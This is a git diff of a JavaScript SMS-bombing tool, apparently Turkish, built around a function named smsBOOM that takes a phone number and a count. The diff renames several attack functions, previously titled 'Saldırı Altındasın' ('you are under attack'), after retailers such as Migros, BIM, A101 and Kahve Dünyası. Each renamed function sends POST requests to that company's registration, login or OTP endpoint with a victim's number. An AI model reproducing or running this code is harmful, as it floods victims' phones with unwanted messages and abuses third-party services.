@@ -14,7 +14,7 @@ async function smsBOOM(numara, miktar) {
         basarili: 0,
     };
 
-    function Saldırı Altındasın(no) {
+    function kigili(no) {
         request.post({
             url: 'https://www.kigili.com/users/registration/',
             form: {
@@ -39,7 +39,7 @@ async function smsBOOM(numara, miktar) {
         });
     }
 
-    function Saldırı Altındasın(no) {
+    function kahvedunyasi(no) {
         request.post({
             url: 'https://core.kahvedunyasi.com/api/users/sms/send',
             form: {
@@ -58,7 +58,7 @@ async function smsBOOM(numara, miktar) {
         });
     }
 
-    function Saldırı Altındasın(no) {
+    function naosstars(no) {
         request.post({
             url: 'https://shop.naosstars.com/users/register',
             form: {
@@ -85,7 +85,7 @@ async function smsBOOM(numara, miktar) {
         });
     }
 
-    function Saldırı Altındasın(no) {
+    function wmf(no) {
         request.post({
             url: 'https://www.wmf.com.tr/users/register/',
             form: {
@@ -111,7 +111,7 @@ async function smsBOOM(numara, miktar) {
         });
     }
 
-    function Saldırı Altındasın(no) {
+    function bim(no) {
         request.post({
             url: 'https://bim.veesk.net:443/service/v1.0/account/login',
             json: {
@@ -148,7 +148,7 @@ async function smsBOOM(numara, miktar) {
         });
     }
 
-    function Saldırı Altındasın(no) {
+    function migros(no) {
         request.post({
             url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
             json: {
@@ -166,7 +166,7 @@ async function smsBOOM(numara, miktar) {
         });
     }
 
-    function Saldırı Altındasın(no) {
+    function a101(no) {
         request.post({
             url: 'https://www.a101.com.tr:443/users/otp-login/',
             json: {
